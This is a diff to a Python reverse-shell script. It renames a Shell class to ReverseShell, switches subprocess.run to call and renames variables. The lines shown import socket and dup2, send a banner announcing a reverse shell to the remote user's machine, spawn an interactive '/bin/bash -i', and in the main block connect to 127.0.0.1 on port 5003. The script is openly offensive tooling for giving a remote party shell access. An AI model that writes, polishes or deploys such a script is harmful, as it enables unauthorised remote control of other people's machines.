@@ -2,14 +2,13 @@
 
 try:
     import time
-    from subprocess import run
+    from subprocess import call
     from os import dup2
     import socket
     import os
     import requests
 except ImportError:
     raise RuntimeError("Important modules are missing!")
-
 
 # # # # # # # # # # # # # # # # # # # # # #
 #                                         #
@@ -21,7 +20,7 @@ except ImportError:
 # # # # # # # # # # # # # # # # # # # # # #
 
 
-class Shell:
+class ReverseShell:
 
     def __init__(
             self,
@@ -76,16 +75,16 @@ class Shell:
             socket_sock.send(f"\n\033[0;37m[\033[0;31m+\033[0;37m] Successfully ".encode() +
                 f"started a reverse shell to {self.remote_username}'s machine!\n\n".encode())
 
-            run([
+            call([
                 "/bin/bash",
                 "-i"
             ])
 
 
 if __name__ == "__main__":
-    os.system('clear')
+    call(["clear"])
 
-    reverse_connection = Shell(
+    remote_connection = ReverseShell(
         os.getlogin(),
         socket.gethostname(),
         "127.0.0.1",
@@ -93,4 +92,4 @@ if __name__ == "__main__":
         5003
     )
 
-    reverse_connection.shell()
+    remote_connection.shell()
